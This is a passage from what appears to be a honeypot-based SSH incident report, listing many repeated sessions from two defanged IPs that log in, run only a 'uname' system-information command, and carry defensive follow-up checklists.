| `2026-08-08 00:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e4b5a416f3c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:41` | `cowrie.session.connect` |
| `2026-08-08 00:55:41` | `cowrie.client.version` |
| `2026-08-08 00:55:42` | `cowrie.client.kex` |
| `2026-08-08 00:55:42` | `cowrie.login.success` |
| `2026-08-08 00:55:43` | `cowrie.session.params` |
| `2026-08-08 00:55:43` | `cowrie.command.input` |
| `2026-08-08 00:55:43` | `cowrie.log.closed` |
| `2026-08-08 00:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0f26ff422a1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:47` | `cowrie.session.connect` |
| `2026-08-08 00:55:47` | `cowrie.client.version` |
| `2026-08-08 00:55:47` | `cowrie.client.kex` |
| `2026-08-08 00:55:47` | `cowrie.login.success` |
| `2026-08-08 00:55:48` | `cowrie.session.params` |
| `2026-08-08 00:55:48` | `cowrie.command.input` |
| `2026-08-08 00:55:48` | `cowrie.log.closed` |
| `2026-08-08 00:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c234e04dc6be

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:52` | `cowrie.session.connect` |
| `2026-08-08 00:55:52` | `cowrie.client.version` |
| `2026-08-08 00:55:52` | `cowrie.client.kex` |
| `2026-08-08 00:55:52` | `cowrie.login.success` |
| `2026-08-08 00:55:53` | `cowrie.session.params` |
| `2026-08-08 00:55:53` | `cowrie.command.input` |
| `2026-08-08 00:55:53` | `cowrie.log.closed` |
| `2026-08-08 00:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e30311acec4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:57` | `cowrie.session.connect` |
| `2026-08-08 00:55:57` | `cowrie.client.version` |
| `2026-08-08 00:55:57` | `cowrie.client.kex` |
| `2026-08-08 00:55:57` | `cowrie.login.success` |
| `2026-08-08 00:55:58` | `cowrie.session.params` |
| `2026-08-08 00:55:58` | `cowrie.command.input` |
| `2026-08-08 00:55:58` | `cowrie.log.closed` |
| `2026-08-08 00:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb6104fd0f2b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:56 |
| **Last Seen** | 2026-08-08 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:56:02` | `cowrie.session.connect` |
| `2026-08-08 00:56:02` | `cowrie.client.version` |
| `2026-08-08 00:56:02` | `cowrie.client.kex` |
| `2026-08-08 00:56:03` | `cowrie.login.success` |
| `2026-08-08 00:56:03` | `cowrie.session.params` |
| `2026-08-08 00:56:03` | `cowrie.command.input` |
| `2026-08-08 00:56:03` | `cowrie.log.closed` |
| `2026-08-08 00:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c27f08789a0c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:56 |
| **Last Seen** | 2026-08-08 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:56:07` | `cowrie.session.connect` |
| `2026-08-08 00:56:07` | `cowrie.client.version` |
| `2026-08-08 00:56:07` | `cowrie.client.kex` |
| `2026-08-08 00:56:08` | `cowrie.login.success` |
| `2026-08-08 00:56:09` | `cowrie.session.params` |
| `2026-08-08 00:56:09` | `cowrie.command.input` |
| `2026-08-08 00:56:09` | `cowrie.log.closed` |
| `2026-08-08 00:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c32791aecb51

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:56 |
| **Last Seen** | 2026-08-08 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:56:13` | `cowrie.session.connect` |
| `2026-08-08 00:56:13` | `cowrie.client.version` |
| `2026-08-08 00:56:13` | `cowrie.client.kex` |
| `2026-08-08 00:56:13` | `cowrie.login.success` |
| `2026-08-08 00:56:14` | `cowrie.session.params` |
| `2026-08-08 00:56:14` | `cowrie.command.input` |
| `2026-08-08 00:56:14` | `cowrie.log.closed` |
| `2026-08-08 00:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f36147b63ca

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:56 |
| **Last Seen** | 2026-08-08 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:56:18` | `cowrie.session.connect` |
| `2026-08-08 00:56:18` | `cowrie.client.version` |
| `2026-08-08 00:56:18` | `cowrie.client.kex` |
| `2026-08-08 00:56:18` | `cowrie.login.success` |
| `2026-08-08 00:56:19` | `cowrie.session.params` |
| `2026-08-08 00:56:19` | `cowrie.command.input` |
| `2026-08-08 00:56:19` | `cowrie.log.closed` |
| `2026-08-08 00:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee20ec9dcafa

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:56 |
| **Last Seen** | 2026-08-08 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:56:23` | `cowrie.session.connect` |
| `2026-08-08 00:56:23` | `cowrie.client.version` |
| `2026-08-08 00:56:24` | `cowrie.client.kex` |
| `2026-08-08 00:56:24` | `cowrie.login.success` |
| `2026-08-08 00:56:25` | `cowrie.session.params` |
| `2026-08-08 00:56:25` | `cowrie.command.input` |
| `2026-08-08 00:56:25` | `cowrie.log.closed` |
| `2026-08-08 00:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c215cc878a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:56 |
| **Last Seen** | 2026-08-08 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:56:29` | `cowrie.session.connect` |
| `2026-08-08 00:56:29` | `cowrie.client.version` |
| `2026-08-08 00:56:29` | `cowrie.client.kex` |
| `2026-08-08 00:56:29` | `cowrie.login.success` |
| `2026-08-08 00:56:30` | `cowrie.session.params` |
| `2026-08-08 00:56:30` | `cowrie.command.input` |
| `2026-08-08 00:56:30` | `cowrie.log.closed` |
| `2026-08-08 00:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fed0acc925d6

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:56 |
| **Last Seen** | 2026-08-08 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:56:34` | `cowrie.session.connect` |
| `2026-08-08 00:56:34` | `cowrie.client.version` |
| `2026-08-08 00:56:34` | `cowrie.client.kex` |
| `2026-08-08 00:56:34` | `cowrie.login.success` |
| `2026-08-08 00:56:35` | `cowrie.session.params` |
| `2026-08-08 00:56:35` | `cowrie.command.input` |
| `2026-08-08 00:56:35` | `cowrie.log.closed` |
| `2026-08-08 00:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edaea6e634d4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:56 |
| **Last Seen** | 2026-08-08 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:56:39` | `cowrie.session.connect` |
| `2026-08-08 00:56:39` | `cowrie.client.version` |
| `2026-08-08 00:56:39` | `cowrie.client.kex` |
| `2026-08-08 00:56:40` | `cowrie.login.success` |
| `2026-08-08 00:56:40` | `cowrie.session.params` |
| `2026-08-08 00:56:40` | `cowrie.command.input` |
| `2026-08-08 00:56:40` | `cowrie.log.closed` |
| `2026-08-08 00:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-437a536c9651

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:56 |
| **Last Seen** | 2026-08-08 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:56:45` | `cowrie.session.connect` |
| `2026-08-08 00:56:45` | `cowrie.client.version` |
| `2026-08-08 00:56:45` | `cowrie.client.kex` |
| `2026-08-08 00:56:45` | `cowrie.login.success` |
| `2026-08-08 00:56:46` | `cowrie.session.params` |
| `2026-08-08 00:56:46` | `cowrie.command.input` |
| `2026-08-08 00:56:46` | `cowrie.log.closed` |
| `2026-08-08 00:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c7cdc40f75

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:56 |
| **Last Seen** | 2026-08-08 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:56:50` | `cowrie.session.connect` |
| `2026-08-08 00:56:50` | `cowrie.client.version` |
| `2026-08-08 00:56:50` | `cowrie.client.kex` |
| `2026-08-08 00:56:51` | `cowrie.login.success` |
| `2026-08-08 00:56:52` | `cowrie.session.params` |
| `2026-08-08 00:56:52` | `cowrie.command.input` |
| `2026-08-08 00:56:52` | `cowrie.log.closed` |
| `2026-08-08 00:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08115223bf25

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:56 |
| **Last Seen** | 2026-08-08 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:56:56` | `cowrie.session.connect` |
| `2026-08-08 00:56:56` | `cowrie.client.version` |
| `2026-08-08 00:56:56` | `cowrie.client.kex` |
| `2026-08-08 00:56:56` | `cowrie.login.success` |
| `2026-08-08 00:56:57` | `cowrie.session.params` |
| `2026-08-08 00:56:57` | `cowrie.command.input` |
| `2026-08-08 00:56:57` | `cowrie.log.closed` |
| `2026-08-08 00:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a22a4895f66

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:57:01` | `cowrie.session.connect` |
| `2026-08-08 00:57:01` | `cowrie.client.version` |
| `2026-08-08 00:57:01` | `cowrie.client.kex` |
| `2026-08-08 00:57:01` | `cowrie.login.success` |
| `2026-08-08 00:57:02` | `cowrie.session.params` |
| `2026-08-08 00:57:02` | `cowrie.command.input` |
| `2026-08-08 00:57:02` | `cowrie.log.closed` |
| `2026-08-08 00:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d95046c28a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:57:06` | `cowrie.session.connect` |
| `2026-08-08 00:57:06` | `cowrie.client.version` |
| `2026-08-08 00:57:06` | `cowrie.client.kex` |
| `2026-08-08 00:57:07` | `cowrie.login.success` |
| `2026-08-08 00:57:08` | `cowrie.session.params` |
| `2026-08-08 00:57:08` | `cowrie.command.input` |
| `2026-08-08 00:57:08` | `cowrie.log.closed` |
| `2026-08-08 00:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4692f90699cf

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:57:07` | `cowrie.session.connect` |
| `2026-08-08 00:57:07` | `cowrie.client.version` |
| `2026-08-08 00:57:07` | `cowrie.client.kex` |
| `2026-08-08 00:57:08` | `cowrie.login.success` |
| `2026-08-08 00:57:09` | `cowrie.session.params` |
| `2026-08-08 00:57:09` | `cowrie.command.input` |
| `2026-08-08 00:57:09` | `cowrie.log.closed` |
| `2026-08-08 00:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7187bf961da7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:57:12` | `cowrie.session.connect` |
| `2026-08-08 00:57:12` | `cowrie.client.version` |
| `2026-08-08 00:57:12` | `cowrie.client.kex` |
| `2026-08-08 00:57:12` | `cowrie.login.success` |
| `2026-08-08 00:57:13` | `cowrie.session.params` |
| `2026-08-08 00:57:13` | `cowrie.command.input` |
| `2026-08-08 00:57:13` | `cowrie.log.closed` |
| `2026-08-08 00:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81910637b596

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:57:17` | `cowrie.session.connect` |
| `2026-08-08 00:57:17` | `cowrie.client.version` |
| `2026-08-08 00:57:17` | `cowrie.client.kex` |
| `2026-08-08 00:57:17` | `cowrie.login.success` |
| `2026-08-08 00:57:18` | `cowrie.session.params` |
| `2026-08-08 00:57:18` | `cowrie.command.input` |
| `2026-08-08 00:57:18` | `cowrie.log.closed` |
| `2026-08-08 00:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f01107a30df9

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:57:22` | `cowrie.session.connect` |
| `2026-08-08 00:57:22` | `cowrie.client.version` |
| `2026-08-08 00:57:22` | `cowrie.client.kex` |
| `2026-08-08 00:57:23` | `cowrie.login.success` |
| `2026-08-08 00:57:23` | `cowrie.session.params` |
| `2026-08-08 00:57:23` | `cowrie.command.input` |
| `2026-08-08 00:57:23` | `cowrie.log.closed` |
| `2026-08-08 00:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bfba421cde0

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:57:28` | `cowrie.session.connect` |
| `2026-08-08 00:57:28` | `cowrie.client.version` |
| `2026-08-08 00:57:28` | `cowrie.client.kex` |
| `2026-08-08 00:57:28` | `cowrie.login.success` |
| `2026-08-08 00:57:29` | `cowrie.session.params` |
| `2026-08-08 00:57:29` | `cowrie.command.input` |
| `2026-08-08 00:57:29` | `cowrie.log.closed` |
| `2026-08-08 00:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d37f1f28ca9

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:57:33` | `cowrie.session.connect` |
| `2026-08-08 00:57:33` | `cowrie.client.version` |
| `2026-08-08 00:57:33` | `cowrie.client.kex` |
| `2026-08-08 00:57:34` | `cowrie.login.success` |
| `2026-08-08 00:57:35` | `cowrie.session.params` |
| `2026-08-08 00:57:35` | `cowrie.command.input` |
| `2026-08-08 00:57:35` | `cowrie.log.closed` |
| `2026-08-08 00:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705275e0eb50

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:57:39` | `cowrie.session.connect` |
| `2026-08-08 00:57:39` | `cowrie.client.version` |
| `2026-08-08 00:57:39` | `cowrie.client.kex` |
| `2026-08-08 00:57:39` | `cowrie.login.success` |
| `2026-08-08 00:57:40` | `cowrie.session.params` |
| `2026-08-08 00:57:40` | `cowrie.command.input` |
| `2026-08-08 00:57:40` | `cowrie.log.closed` |
| `2026-08-08 00:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-496a48828316

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:57:44` | `cowrie.session.connect` |
| `2026-08-08 00:57:44` | `cowrie.client.version` |
| `2026-08-08 00:57:44` | `cowrie.client.kex` |
| `2026-08-08 00:57:45` | `cowrie.login.success` |
| `2026-08-08 00:57:45` | `cowrie.session.params` |
| `2026-08-08 00:57:45` | `cowrie.command.input` |
| `2026-08-08 00:57:46` | `cowrie.log.closed` |
| `2026-08-08 00:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0e0ce0b8a2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
